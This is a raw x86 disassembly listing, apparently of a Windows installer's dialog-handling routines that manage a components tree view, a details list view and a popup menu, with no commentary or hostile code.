  404f44:	e8 34 c2 ff ff       	call   0x40117d
  404f49:	a1 f0 a5 42 00       	mov    0x42a5f0,%eax
  404f4e:	c1 e8 08             	shr    $0x8,%eax
  404f51:	43                   	inc    %ebx
  404f52:	f7 d0                	not    %eax
  404f54:	83 e0 01             	and    $0x1,%eax
  404f57:	89 5d 10             	mov    %ebx,0x10(%ebp)
  404f5a:	89 45 14             	mov    %eax,0x14(%ebp)
  404f5d:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404f64:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  404f67:	74 4e                	je     0x404fb7
  404f69:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f6c:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  404f73:	75 0e                	jne    0x404f83
  404f75:	ff 70 5c             	push   0x5c(%eax)
  404f78:	57                   	push   %edi
  404f79:	68 19 04 00 00       	push   $0x419
  404f7e:	ff 75 fc             	push   -0x4(%ebp)
  404f81:	ff d6                	call   *%esi
  404f83:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f86:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  404f8d:	75 28                	jne    0x404fb7
  404f8f:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404f93:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404f96:	8b 40 5c             	mov    0x5c(%eax),%eax
  404f99:	75 0f                	jne    0x404faa
  404f9b:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  404fa1:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404fa5:	83 08 20             	orl    $0x20,(%eax)
  404fa8:	eb 0d                	jmp    0x404fb7
  404faa:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  404fb0:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404fb4:	83 20 df             	andl   $0xffffffdf,(%eax)
  404fb7:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404fbe:	75 6f                	jne    0x40502f
  404fc0:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404fc6:	0f 85 5d 02 00 00    	jne    0x405229
  404fcc:	8b 45 10             	mov    0x10(%ebp),%eax
  404fcf:	c1 e8 10             	shr    $0x10,%eax
  404fd2:	66 3d 01 00          	cmp    $0x1,%ax
  404fd6:	0f 85 4d 02 00 00    	jne    0x405229
  404fdc:	57                   	push   %edi
  404fdd:	57                   	push   %edi
  404fde:	68 47 01 00 00       	push   $0x147
  404fe3:	ff 75 f8             	push   -0x8(%ebp)
  404fe6:	ff d6                	call   *%esi
  404fe8:	83 f8 ff             	cmp    $0xffffffff,%eax
  404feb:	0f 84 38 02 00 00    	je     0x405229
  404ff1:	57                   	push   %edi
  404ff2:	50                   	push   %eax
  404ff3:	68 50 01 00 00       	push   $0x150
  404ff8:	ff 75 f8             	push   -0x8(%ebp)
  404ffb:	ff d6                	call   *%esi
  404ffd:	8b d8                	mov    %eax,%ebx
  404fff:	83 fb ff             	cmp    $0xffffffff,%ebx
  405002:	74 08                	je     0x40500c
  405004:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405007:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  40500a:	75 03                	jne    0x40500f
  40500c:	6a 20                	push   $0x20
  40500e:	5b                   	pop    %ebx
  40500f:	53                   	push   %ebx
  405010:	e8 88 c2 ff ff       	call   0x40129d
  405015:	53                   	push   %ebx
  405016:	57                   	push   %edi
  405017:	68 20 04 00 00       	push   $0x420
  40501c:	ff 75 08             	push   0x8(%ebp)
  40501f:	ff d6                	call   *%esi
  405021:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  405025:	89 7d 14             	mov    %edi,0x14(%ebp)
  405028:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40502f:	b8 00 02 00 00       	mov    $0x200,%eax
  405034:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405037:	75 08                	jne    0x405041
  405039:	57                   	push   %edi
  40503a:	57                   	push   %edi
  40503b:	50                   	push   %eax
  40503c:	ff 75 fc             	push   -0x4(%ebp)
  40503f:	ff d6                	call   *%esi
  405041:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  405048:	75 32                	jne    0x40507c
  40504a:	a1 f0 21 42 00       	mov    0x4221f0,%eax
  40504f:	3b c7                	cmp    %edi,%eax
  405051:	74 07                	je     0x40505a
  405053:	50                   	push   %eax
  405054:	ff 15 34 90 40 00    	call   *0x409034
  40505a:	a1 f4 21 42 00       	mov    0x4221f4,%eax
  40505f:	3b c7                	cmp    %edi,%eax
  405061:	74 07                	je     0x40506a
  405063:	50                   	push   %eax
  405064:	ff 15 30 91 40 00    	call   *0x409130
  40506a:	89 3d f0 21 42 00    	mov    %edi,0x4221f0
  405070:	89 3d f4 21 42 00    	mov    %edi,0x4221f4
  405076:	89 3d f8 a5 42 00    	mov    %edi,0x42a5f8
  40507c:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  405083:	0f 85 60 01 00 00    	jne    0x4051e9
  405089:	57                   	push   %edi
  40508a:	57                   	push   %edi
  40508b:	e8 5f c1 ff ff       	call   0x4011ef
  405090:	8b 45 10             	mov    0x10(%ebp),%eax
  405093:	3b c7                	cmp    %edi,%eax
  405095:	74 0e                	je     0x4050a5
  405097:	83 f8 ff             	cmp    $0xffffffff,%eax
  40509a:	74 01                	je     0x40509d
  40509c:	48                   	dec    %eax
  40509d:	50                   	push   %eax
  40509e:	6a 08                	push   $0x8
  4050a0:	e8 cf fa ff ff       	call   0x404b74
  4050a5:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4050a8:	74 3f                	je     0x4050e9
  4050aa:	ff 35 f4 21 42 00    	push   0x4221f4
  4050b0:	e8 33 c2 ff ff       	call   0x4012e8
  4050b5:	8b d8                	mov    %eax,%ebx
  4050b7:	53                   	push   %ebx
  4050b8:	e8 e0 c1 ff ff       	call   0x40129d
  4050bd:	33 c0                	xor    %eax,%eax
  4050bf:	33 c9                	xor    %ecx,%ecx
  4050c1:	3b df                	cmp    %edi,%ebx
  4050c3:	7e 0e                	jle    0x4050d3
  4050c5:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4050c8:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  4050cb:	74 01                	je     0x4050ce
  4050cd:	41                   	inc    %ecx
  4050ce:	40                   	inc    %eax
  4050cf:	3b c3                	cmp    %ebx,%eax
  4050d1:	7c f2                	jl     0x4050c5
  4050d3:	57                   	push   %edi
  4050d4:	51                   	push   %ecx
  4050d5:	68 4e 01 00 00       	push   $0x14e
  4050da:	ff 75 f8             	push   -0x8(%ebp)
  4050dd:	ff d6                	call   *%esi
  4050df:	89 5d 14             	mov    %ebx,0x14(%ebp)
  4050e2:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  4050e9:	57                   	push   %edi
  4050ea:	57                   	push   %edi
  4050eb:	e8 ff c0 ff ff       	call   0x4011ef
  4050f0:	39 3d ac a5 42 00    	cmp    %edi,0x42a5ac
  4050f6:	a1 f4 21 42 00       	mov    0x4221f4,%eax
  4050fb:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4050fe:	a1 a8 a5 42 00       	mov    0x42a5a8,%eax
  405103:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  40510a:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40510d:	0f 8e a0 00 00 00    	jle    0x4051b3
  405113:	8d 58 08             	lea    0x8(%eax),%ebx
  405116:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405119:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40511c:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  40511f:	3b c7                	cmp    %edi,%eax
  405121:	74 78                	je     0x40519b
  405123:	8b 0b                	mov    (%ebx),%ecx
  405125:	66 f7 c1 00 01       	test   $0x100,%cx
  40512a:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40512d:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  405134:	74 13                	je     0x405149
  405136:	8d 43 10             	lea    0x10(%ebx),%eax
  405139:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  405140:	89 45 c8             	mov    %eax,-0x38(%ebp)
  405143:	81 23 ff fe ff ff    	andl   $0xfffffeff,(%ebx)
  405149:	f6 c1 40             	test   $0x40,%cl
  40514c:	74 05                	je     0x405153
  40514e:	6a 03                	push   $0x3
  405150:	58                   	pop    %eax
  405151:	eb 0e                	jmp    0x405161
  405153:	8b c1                	mov    %ecx,%eax
  405155:	83 e0 01             	and    $0x1,%eax
  405158:	40                   	inc    %eax
  405159:	f6 c1 10             	test   $0x10,%cl
  40515c:	74 03                	je     0x405161
  40515e:	83 c0 03             	add    $0x3,%eax
  405161:	ff 75 bc             	push   -0x44(%ebp)
  405164:	8b d1                	mov    %ecx,%edx
  405166:	c1 e0 0b             	shl    $0xb,%eax
  405169:	83 e2 08             	and    $0x8,%edx
  40516c:	0b c2                	or     %edx,%eax
  40516e:	8b d1                	mov    %ecx,%edx
  405170:	c1 f9 05             	sar    $0x5,%ecx
  405173:	03 c0                	add    %eax,%eax
  405175:	83 e2 20             	and    $0x20,%edx
  405178:	0b c2                	or     %edx,%eax
  40517a:	83 e1 01             	and    $0x1,%ecx
  40517d:	41                   	inc    %ecx
  40517e:	51                   	push   %ecx
  40517f:	68 02 11 00 00       	push   $0x1102
  405184:	ff 75 fc             	push   -0x4(%ebp)
  405187:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40518a:	ff d6                	call   *%esi
  40518c:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40518f:	50                   	push   %eax
  405190:	57                   	push   %edi
  405191:	68 3f 11 00 00       	push   $0x113f
  405196:	ff 75 fc             	push   -0x4(%ebp)
  405199:	ff d6                	call   *%esi
  40519b:	ff 45 ec             	incl   -0x14(%ebp)
  40519e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4051a1:	81 c3 18 08 00 00    	add    $0x818,%ebx
  4051a7:	3b 05 ac a5 42 00    	cmp    0x42a5ac,%eax
  4051ad:	0f 8c 63 ff ff ff    	jl     0x405116
  4051b3:	66 81 3d 7e a6 42 00 	cmpw   $0x400,0x42a67e
  4051ba:	00 04 
  4051bc:	75 0c                	jne    0x4051ca
  4051be:	6a 01                	push   $0x1
  4051c0:	57                   	push   %edi
  4051c1:	ff 75 fc             	push   -0x4(%ebp)
  4051c4:	ff 15 74 92 40 00    	call   *0x409274
  4051ca:	a1 68 95 42 00       	mov    0x429568,%eax
  4051cf:	39 78 10             	cmp    %edi,0x10(%eax)
  4051d2:	74 15                	je     0x4051e9
  4051d4:	6a 05                	push   $0x5
  4051d6:	e8 8f f5 ff ff       	call   0x40476a
  4051db:	57                   	push   %edi
  4051dc:	50                   	push   %eax
  4051dd:	6a fb                	push   $0xfffffffb
  4051df:	68 ff 03 00 00       	push   $0x3ff
  4051e4:	e8 a4 f4 ff ff       	call   0x40468d
  4051e9:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  4051f0:	75 37                	jne    0x405229
  4051f2:	66 f7 05 f0 a5 42 00 	testw  $0x100,0x42a5f0
  4051f9:	00 01 
  4051fb:	74 2c                	je     0x405229
  4051fd:	8b 35 48 92 40 00    	mov    0x409248,%esi
  405203:	33 c0                	xor    %eax,%eax
  405205:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  405209:	0f 94 c0             	sete   %al
  40520c:	c1 e0 03             	shl    $0x3,%eax
  40520f:	8b f8                	mov    %eax,%edi
  405211:	57                   	push   %edi
  405212:	ff 75 fc             	push   -0x4(%ebp)
  405215:	ff d6                	call   *%esi
  405217:	57                   	push   %edi
  405218:	68 fe 03 00 00       	push   $0x3fe
  40521d:	ff 75 08             	push   0x8(%ebp)
  405220:	ff 15 5c 92 40 00    	call   *0x40925c
  405226:	50                   	push   %eax
  405227:	ff d6                	call   *%esi
  405229:	ff 75 14             	push   0x14(%ebp)
  40522c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40522f:	ff 75 10             	push   0x10(%ebp)
  405232:	e8 c9 ee ff ff       	call   0x404100
  405237:	5f                   	pop    %edi
  405238:	5e                   	pop    %esi
  405239:	5b                   	pop    %ebx
  40523a:	c9                   	leave
  40523b:	c2 10 00             	ret    $0x10
  40523e:	55                   	push   %ebp
  40523f:	8b ec                	mov    %esp,%ebp
  405241:	83 ec 30             	sub    $0x30,%esp
  405244:	a1 4c 95 42 00       	mov    0x42954c,%eax
  405249:	57                   	push   %edi
  40524a:	33 ff                	xor    %edi,%edi
  40524c:	3b c7                	cmp    %edi,%eax
  40524e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405251:	0f 84 b5 00 00 00    	je     0x40530c
  405257:	53                   	push   %ebx
  405258:	8b 1d 74 a6 42 00    	mov    0x42a674,%ebx
  40525e:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  405261:	83 e3 01             	and    $0x1,%ebx
  405264:	56                   	push   %esi
  405265:	be 00 2a 42 00       	mov    $0x422a00,%esi
  40526a:	75 09                	jne    0x405275
  40526c:	ff 75 08             	push   0x8(%ebp)
  40526f:	56                   	push   %esi
  405270:	e8 6c 16 00 00       	call   0x4068e1
  405275:	56                   	push   %esi
  405276:	e8 62 12 00 00       	call   0x4064dd
  40527b:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  40527e:	89 45 08             	mov    %eax,0x8(%ebp)
  405281:	74 1b                	je     0x40529e
  405283:	ff 75 0c             	push   0xc(%ebp)
  405286:	e8 52 12 00 00       	call   0x4064dd
  40528b:	03 45 08             	add    0x8(%ebp),%eax
  40528e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  405293:	73 75                	jae    0x40530a
  405295:	ff 75 0c             	push   0xc(%ebp)
  405298:	56                   	push   %esi
  405299:	e8 45 12 00 00       	call   0x4064e3
  40529e:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4052a2:	75 0d                	jne    0x4052b1
  4052a4:	56                   	push   %esi
  4052a5:	ff 35 58 95 42 00    	push   0x429558
  4052ab:	ff 15 3c 92 40 00    	call   *0x40923c
  4052b1:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4052b5:	75 44                	jne    0x4052fb
  4052b7:	57                   	push   %edi
  4052b8:	57                   	push   %edi
  4052b9:	68 04 10 00 00       	push   $0x1004
  4052be:	ff 75 fc             	push   -0x4(%ebp)
  4052c1:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4052c4:	8b 35 78 92 40 00    	mov    0x409278,%esi
  4052ca:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4052d1:	ff d6                	call   *%esi
  4052d3:	2b c3                	sub    %ebx,%eax
  4052d5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4052d8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4052db:	50                   	push   %eax
  4052dc:	57                   	push   %edi
  4052dd:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4052e2:	2b c3                	sub    %ebx,%eax
  4052e4:	50                   	push   %eax
  4052e5:	ff 75 fc             	push   -0x4(%ebp)
  4052e8:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4052eb:	ff d6                	call   *%esi
  4052ed:	57                   	push   %edi
  4052ee:	ff 75 d4             	push   -0x2c(%ebp)
  4052f1:	68 13 10 00 00       	push   $0x1013
  4052f6:	ff 75 fc             	push   -0x4(%ebp)
  4052f9:	ff d6                	call   *%esi
  4052fb:	3b df                	cmp    %edi,%ebx
  4052fd:	74 0b                	je     0x40530a
  4052ff:	8b 45 08             	mov    0x8(%ebp),%eax
  405302:	66 89 3c 45 00 2a 42 	mov    %di,0x422a00(,%eax,2)
  405309:	00 
  40530a:	5e                   	pop    %esi
  40530b:	5b                   	pop    %ebx
  40530c:	5f                   	pop    %edi
  40530d:	c9                   	leave
  40530e:	c2 08 00             	ret    $0x8
  405311:	56                   	push   %esi
  405312:	8b 35 a8 a5 42 00    	mov    0x42a5a8,%esi
  405318:	57                   	push   %edi
  405319:	8b 3d ac a5 42 00    	mov    0x42a5ac,%edi
  40531f:	6a 00                	push   $0x0
  405321:	ff 15 b8 92 40 00    	call   *0x4092b8
  405327:	09 05 80 a6 42 00    	or     %eax,0x42a680
  40532d:	6a 00                	push   $0x0
  40532f:	e8 b1 ed ff ff       	call   0x4040e5
  405334:	85 ff                	test   %edi,%edi
  405336:	74 2b                	je     0x405363
  405338:	83 c6 0c             	add    $0xc,%esi
  40533b:	4f                   	dec    %edi
  40533c:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405340:	74 0f                	je     0x405351
  405342:	ff 74 24 0c          	push   0xc(%esp)
  405346:	ff 36                	push   (%esi)
  405348:	e8 42 c0 ff ff       	call   0x40138f
  40534d:	85 c0                	test   %eax,%eax
  40534f:	75 0c                	jne    0x40535d
  405351:	81 c6 18 08 00 00    	add    $0x818,%esi
  405357:	85 ff                	test   %edi,%edi
  405359:	75 e0                	jne    0x40533b
  40535b:	eb 06                	jmp    0x405363
  40535d:	ff 05 4c a6 42 00    	incl   0x42a64c
  405363:	68 04 04 00 00       	push   $0x404
  405368:	e8 78 ed ff ff       	call   0x4040e5
  40536d:	ff 15 b4 92 40 00    	call   *0x4092b4
  405373:	a1 4c a6 42 00       	mov    0x42a64c,%eax
  405378:	5f                   	pop    %edi
  405379:	5e                   	pop    %esi
  40537a:	c2 04 00             	ret    $0x4
  40537d:	55                   	push   %ebp
  40537e:	8b ec                	mov    %esp,%ebp
  405380:	83 ec 40             	sub    $0x40,%esp
  405383:	53                   	push   %ebx
  405384:	56                   	push   %esi
  405385:	8b 35 4c 95 42 00    	mov    0x42954c,%esi
  40538b:	33 db                	xor    %ebx,%ebx
  40538d:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  405394:	57                   	push   %edi
  405395:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405398:	0f 85 87 01 00 00    	jne    0x405525
  40539e:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  4053a2:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  4053a6:	6a 02                	push   $0x2
  4053a8:	5e                   	pop    %esi
  4053a9:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4053ac:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4053af:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4053b2:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4053b5:	33 c0                	xor    %eax,%eax
  4053b7:	8d 7d e0             	lea    -0x20(%ebp),%edi
  4053ba:	ab                   	stos   %eax,%es:(%edi)
  4053bb:	ab                   	stos   %eax,%es:(%edi)
  4053bc:	a1 8c a5 42 00       	mov    0x42a58c,%eax
  4053c1:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4053c4:	8b 40 60             	mov    0x60(%eax),%eax
  4053c7:	8b 3d 5c 92 40 00    	mov    0x40925c,%edi
  4053cd:	68 03 04 00 00       	push   $0x403
  4053d2:	ff 75 08             	push   0x8(%ebp)
  4053d5:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4053d8:	89 45 10             	mov    %eax,0x10(%ebp)
  4053db:	ff d7                	call   *%edi
  4053dd:	68 ee 03 00 00       	push   $0x3ee
  4053e2:	ff 75 08             	push   0x8(%ebp)
  4053e5:	a3 60 95 42 00       	mov    %eax,0x429560
  4053ea:	ff d7                	call   *%edi
  4053ec:	68 f8 03 00 00       	push   $0x3f8
  4053f1:	ff 75 08             	push   0x8(%ebp)
  4053f4:	a3 58 95 42 00       	mov    %eax,0x429558
  4053f9:	ff d7                	call   *%edi
  4053fb:	ff 35 60 95 42 00    	push   0x429560
  405401:	a3 4c 95 42 00       	mov    %eax,0x42954c
  405406:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405409:	e8 c0 ec ff ff       	call   0x4040ce
  40540e:	6a 04                	push   $0x4
  405410:	e8 55 f3 ff ff       	call   0x40476a
  405415:	a3 64 95 42 00       	mov    %eax,0x429564
  40541a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40541d:	50                   	push   %eax
  40541e:	ff 75 fc             	push   -0x4(%ebp)
  405421:	89 1d 6c 95 42 00    	mov    %ebx,0x42956c
  405427:	ff 15 84 92 40 00    	call   *0x409284
  40542d:	56                   	push   %esi
  40542e:	ff 15 e0 91 40 00    	call   *0x4091e0
  405434:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405437:	8b 35 78 92 40 00    	mov    0x409278,%esi
  40543d:	2b c8                	sub    %eax,%ecx
  40543f:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405442:	50                   	push   %eax
  405443:	53                   	push   %ebx
  405444:	68 61 10 00 00       	push   $0x1061
  405449:	ff 75 fc             	push   -0x4(%ebp)
  40544c:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40544f:	ff d6                	call   *%esi
  405451:	b8 00 40 00 00       	mov    $0x4000,%eax
  405456:	50                   	push   %eax
  405457:	50                   	push   %eax
  405458:	68 36 10 00 00       	push   $0x1036
  40545d:	ff 75 fc             	push   -0x4(%ebp)
  405460:	ff d6                	call   *%esi
  405462:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405465:	7c 1c                	jl     0x405483
  405467:	ff 75 0c             	push   0xc(%ebp)
  40546a:	53                   	push   %ebx
  40546b:	68 01 10 00 00       	push   $0x1001
  405470:	ff 75 fc             	push   -0x4(%ebp)
  405473:	ff d6                	call   *%esi
  405475:	ff 75 0c             	push   0xc(%ebp)
  405478:	53                   	push   %ebx
  405479:	68 26 10 00 00       	push   $0x1026
  40547e:	ff 75 fc             	push   -0x4(%ebp)
  405481:	ff d6                	call   *%esi
  405483:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  405486:	7c 0e                	jl     0x405496
  405488:	ff 75 10             	push   0x10(%ebp)
  40548b:	53                   	push   %ebx
  40548c:	68 24 10 00 00       	push   $0x1024
  405491:	ff 75 fc             	push   -0x4(%ebp)
  405494:	ff d6                	call   *%esi
  405496:	8b 45 14             	mov    0x14(%ebp),%eax
  405499:	ff 70 30             	push   0x30(%eax)
  40549c:	6a 1b                	push   $0x1b
  40549e:	ff 75 08             	push   0x8(%ebp)
  4054a1:	e8 cf eb ff ff       	call   0x404075
  4054a6:	f6 05 f0 a5 42 00 03 	testb  $0x3,0x42a5f0
  4054ad:	74 34                	je     0x4054e3
  4054af:	53                   	push   %ebx
  4054b0:	ff 35 60 95 42 00    	push   0x429560
  4054b6:	ff 15 48 92 40 00    	call   *0x409248
  4054bc:	f6 05 f0 a5 42 00 02 	testb  $0x2,0x42a5f0
  4054c3:	75 0d                	jne    0x4054d2
  4054c5:	6a 08                	push   $0x8
  4054c7:	ff 75 fc             	push   -0x4(%ebp)
  4054ca:	ff 15 48 92 40 00    	call   *0x409248
  4054d0:	eb 06                	jmp    0x4054d8
  4054d2:	89 1d 60 95 42 00    	mov    %ebx,0x429560
  4054d8:	ff 35 58 95 42 00    	push   0x429558
  4054de:	e8 eb eb ff ff       	call   0x4040ce
  4054e3:	68 ec 03 00 00       	push   $0x3ec
  4054e8:	ff 75 08             	push   0x8(%ebp)
  4054eb:	ff d7                	call   *%edi
  4054ed:	68 00 00 30 75       	push   $0x75300000
  4054f2:	53                   	push   %ebx
  4054f3:	8b f8                	mov    %eax,%edi
  4054f5:	68 01 04 00 00       	push   $0x401
  4054fa:	57                   	push   %edi
  4054fb:	ff d6                	call   *%esi
  4054fd:	f6 05 f0 a5 42 00 04 	testb  $0x4,0x42a5f0
  405504:	74 18                	je     0x40551e
  405506:	ff 75 10             	push   0x10(%ebp)
  405509:	53                   	push   %ebx
  40550a:	68 09 04 00 00       	push   $0x409
  40550f:	57                   	push   %edi
  405510:	ff d6                	call   *%esi
  405512:	ff 75 0c             	push   0xc(%ebp)
  405515:	53                   	push   %ebx
  405516:	68 01 20 00 00       	push   $0x2001
  40551b:	57                   	push   %edi
  40551c:	ff d6                	call   *%esi
  40551e:	33 c0                	xor    %eax,%eax
  405520:	e9 8f 00 00 00       	jmp    0x4055b4
  405525:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  40552c:	75 28                	jne    0x405556
  40552e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405531:	50                   	push   %eax
  405532:	53                   	push   %ebx
  405533:	68 ec 03 00 00       	push   $0x3ec
  405538:	ff 75 08             	push   0x8(%ebp)
  40553b:	ff 15 5c 92 40 00    	call   *0x40925c
  405541:	50                   	push   %eax
  405542:	68 11 53 40 00       	push   $0x405311
  405547:	53                   	push   %ebx
  405548:	53                   	push   %ebx
  405549:	ff 15 a4 90 40 00    	call   *0x4090a4
  40554f:	50                   	push   %eax
  405550:	ff 15 1c 91 40 00    	call   *0x40911c
  405556:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40555d:	8b 3d 48 92 40 00    	mov    0x409248,%edi
  405563:	75 1c                	jne    0x405581
  405565:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  40556b:	75 39                	jne    0x4055a6
  40556d:	53                   	push   %ebx
  40556e:	ff 35 60 95 42 00    	push   0x429560
  405574:	ff d7                	call   *%edi
  405576:	6a 08                	push   $0x8
  405578:	56                   	push   %esi
  405579:	ff d7                	call   *%edi
  40557b:	56                   	push   %esi
  40557c:	e8 4d eb ff ff       	call   0x4040ce
  405581:	33 f6                	xor    %esi,%esi
  405583:	46                   	inc    %esi
  405584:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  40558b:	75 54                	jne    0x4055e1
  40558d:	39 1d 54 95 42 00    	cmp    %ebx,0x429554
  405593:	74 26                	je     0x4055bb
  405595:	6a 78                	push   $0x78
  405597:	c7 05 08 5a 42 00 02 	movl   $0x2,0x425a08
  40559e:	00 00 00 
  4055a1:	e8 a8 ea ff ff       	call   0x40404e
  4055a6:	ff 75 14             	push   0x14(%ebp)
  4055a9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4055ac:	ff 75 10             	push   0x10(%ebp)
  4055af:	e8 4c eb ff ff       	call   0x404100
  4055b4:	5f                   	pop    %edi
  4055b5:	5e                   	pop    %esi
  4055b6:	5b                   	pop    %ebx
  4055b7:	c9                   	leave
  4055b8:	c2 10 00             	ret    $0x10
  4055bb:	6a 08                	push   $0x8
  4055bd:	ff 35 84 a5 42 00    	push   0x42a584
  4055c3:	ff d7                	call   *%edi
  4055c5:	39 1d 4c a6 42 00    	cmp    %ebx,0x42a64c
  4055cb:	75 0e                	jne    0x4055db
  4055cd:	a1 04 5a 42 00       	mov    0x425a04,%eax
  4055d2:	53                   	push   %ebx
  4055d3:	ff 70 34             	push   0x34(%eax)
  4055d6:	e8 63 fc ff ff       	call   0x40523e
  4055db:	56                   	push   %esi
  4055dc:	e8 6d ea ff ff       	call   0x40404e
  4055e1:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  4055e5:	75 bf                	jne    0x4055a6
  4055e7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4055ea:	39 45 10             	cmp    %eax,0x10(%ebp)
  4055ed:	75 b7                	jne    0x4055a6
  4055ef:	53                   	push   %ebx
  4055f0:	53                   	push   %ebx
  4055f1:	68 04 10 00 00       	push   $0x1004
  4055f6:	50                   	push   %eax
  4055f7:	ff 15 78 92 40 00    	call   *0x409278
  4055fd:	3b c3                	cmp    %ebx,%eax
  4055ff:	89 45 0c             	mov    %eax,0xc(%ebp)
  405602:	0f 8e 16 ff ff ff    	jle    0x40551e
  405608:	ff 15 e4 91 40 00    	call   *0x4091e4
  40560e:	6a e1                	push   $0xffffffe1
  405610:	53                   	push   %ebx
  405611:	8b f8                	mov    %eax,%edi
  405613:	e8 c9 12 00 00       	call   0x4068e1
  405618:	50                   	push   %eax
  405619:	56                   	push   %esi
  40561a:	53                   	push   %ebx
  40561b:	57                   	push   %edi
  40561c:	ff 15 e8 91 40 00    	call   *0x4091e8
  405622:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405625:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405629:	c1 e9 10             	shr    $0x10,%ecx
  40562c:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405630:	0f bf c9             	movswl %cx,%ecx
  405633:	75 13                	jne    0x405648
  405635:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405638:	50                   	push   %eax
  405639:	ff 75 fc             	push   -0x4(%ebp)
  40563c:	ff 15 ec 91 40 00    	call   *0x4091ec
  405642:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405645:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405648:	53                   	push   %ebx
  405649:	ff 75 08             	push   0x8(%ebp)
  40564c:	53                   	push   %ebx
  40564d:	51                   	push   %ecx
  40564e:	50                   	push   %eax
  40564f:	68 80 01 00 00       	push   $0x180
  405654:	57                   	push   %edi
  405655:	ff 15 f0 91 40 00    	call   *0x4091f0
  40565b:	3b c6                	cmp    %esi,%eax
  40565d:	0f 85 bb fe ff ff    	jne    0x40551e
  405663:	8b 45 0c             	mov    0xc(%ebp),%eax
  405666:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405669:	c7 45 d4 00 3a 42 00 	movl   $0x423a00,-0x2c(%ebp)
  405670:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  405677:	89 45 08             	mov    %eax,0x8(%ebp)
  40567a:	bf 73 10 00 00       	mov    $0x1073,%edi
